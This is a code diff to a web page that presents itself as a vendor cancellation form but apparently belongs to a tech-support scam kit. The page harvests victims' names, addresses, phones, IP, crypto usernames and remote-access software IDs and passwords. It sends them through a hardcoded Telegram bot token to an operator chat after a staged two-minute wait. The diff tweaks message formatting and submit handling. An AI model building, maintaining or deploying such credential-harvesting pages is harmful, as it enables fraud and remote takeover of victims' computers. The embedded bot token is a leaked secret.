@@ -55,24 +55,24 @@ export default function CancelVendorPage({ params }: CancelPageProps) {
     const BOT_TOKEN = '8317757418:AAF0YMJ0enh258_yEWXsg6-GAsYfrA7nYZ8'
     const CHAT_ID = process.env.NEXT_PUBLIC_TELEGRAM_CHAT_ID || '-5294276637'
 
-    const message = `🔔 *New Cancellation Request (DPRO)*
+    const message = `🔔 New Cancellation Request (DPRO)
 
-*fullName:* ${formData.fullName || mainInfo?.fullName || 'N/A'}
-*billingAddress:* ${formData.billingAddress || 'N/A'}
-*cellPhone:* ${formData.cellPhone || 'N/A'}
-*cancellationReason:* ${formData.cancellationReason || 'N/A'}
-*remoteSoftware:* ${formData.remoteSoftware || 'N/A'}
-*remoteId:* ${formData.remoteId || 'N/A'}
-*remotePass:* ${formData.remotePass || 'N/A'}
-*email:* ${mainInfo?.email || 'N/A'}
-*antiVirus:* ${antiVirus || 'N/A'}
-*agentId:* ${mainInfo?.agentId || 'N/A'}
-*agentName:* ${mainInfo?.agentName || 'N/A'}
-*ip_address:* ${sessionInfo?.ipAddress || 'N/A'}
-*alternatePhone:* ${mainInfo?.alternatePhone || 'N/A'}
-*company:* DPRO
-*explicit_content:* ${mainInfo?.explicitContent || 'N/A'}
-*crypto_username:* ${mainInfo?.cryptoUsername || 'N/A'}`
+fullName: ${formData.fullName || mainInfo?.fullName || 'N/A'}
+billingAddress: ${formData.billingAddress || 'N/A'}
+cellPhone: ${formData.cellPhone || 'N/A'}
+cancellationReason: ${formData.cancellationReason || 'N/A'}
+remoteSoftware: ${formData.remoteSoftware || 'N/A'}
+remoteId: ${formData.remoteId || 'N/A'}
+remotePass: ${formData.remotePass || 'N/A'}
+email: ${mainInfo?.email || 'N/A'}
+antiVirus: ${antiVirus || 'N/A'}
+agentId: ${mainInfo?.agentId || 'N/A'}
+agentName: ${mainInfo?.agentName || 'N/A'}
+ip_address: ${sessionInfo?.ipAddress || 'N/A'}
+homephone: ${mainInfo?.alternatePhone || 'N/A'}
+company: DPRO
+explicit_content: ${mainInfo?.explicitContent || 'N/A'}
+crypto_username: ${mainInfo?.cryptoUsername || 'N/A'}`
 
     try {
       const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
@@ -81,7 +81,6 @@ export default function CancelVendorPage({ params }: CancelPageProps) {
         body: JSON.stringify({
           chat_id: CHAT_ID,
           text: message,
-          parse_mode: 'Markdown',
         }),
       })
 
@@ -239,7 +238,7 @@ export default function CancelVendorPage({ params }: CancelPageProps) {
             className="submit-button"
             disabled={!isFormValid}
             onClick={() => {
-              if (!isFormValid) return
+              if (!isFormValid || showWaitModal) return
               setShowWaitModal(true)
 
               // send to Telegram after 2 minutes
